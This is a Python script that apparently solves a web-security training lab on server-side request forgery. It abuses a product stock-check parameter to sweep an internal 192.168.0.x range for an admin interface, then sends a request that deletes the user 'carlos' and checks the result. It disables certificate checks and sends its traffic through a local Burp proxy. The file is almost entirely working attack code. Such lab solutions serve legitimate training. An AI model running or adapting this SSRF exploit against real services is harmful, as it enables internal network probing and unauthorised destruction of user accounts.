import requests
import urllib3
import sys
import click
import colorama
from colorama import init, Fore


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def ping_sweep(url):
    
    for i in range(2,255):
        ip_address='http://192.168.0.%s:8080/admin'%i
        parameter={'stockApi':ip_address}
        stock_path= '/product/stock'
        ping_request= requests.post(url+stock_path,data=parameter,verify=False,proxies=proxies)
        valid_ip=""
        
        if 'Could not connect to external stock check service' not in ping_request.text:
            print(Fore.GREEN+f"[+] {ip_address} is valid")
            valid_ip+=ip_address
            break
        
    return valid_ip
            

def exploit(url,valid_ip):
    print (Fore.BLUE+"[*] Deleting the user Carlos...")
    stock_path ='/product/stock'
    exploit_payload = '/delete?username=carlos'
    exploit_parameter = {'stockApi':valid_ip+exploit_payload}
    exploit_request = requests.post(url+stock_path,data=exploit_parameter,verify=False,proxies=proxies)
    print(Fore.GREEN+"[+] Exploit sent successfully!")
    
    #Check if user got deleted
    check_parameter = {'stockApi':valid_ip}
    check_request = requests.post(url+stock_path,data=check_parameter,verify=False,proxies=proxies)
    
    if "User deleted successfully!" in check_request.text:
        print(Fore.GREEN+"[+] The user Carlos has been deleted succesfully and the lab has been solved!")
    else:
        print(Fore.RED+"[!] The exploit failed!")




@click.command()
@click.option('-u','--url',type=str,required=True, prompt="The URL of the target",help="The URL of the vulnerable target")
def main(url):
    print(Fore.YELLOW+"[!] USE THE SCRIPT WITH BURP SUITE")
    print(Fore.BLUE+"[*] Sweeping the internal network...")
    valid_ip = ping_sweep(url)
    exploit(url,valid_ip)

if __name__=="__main__":
    main()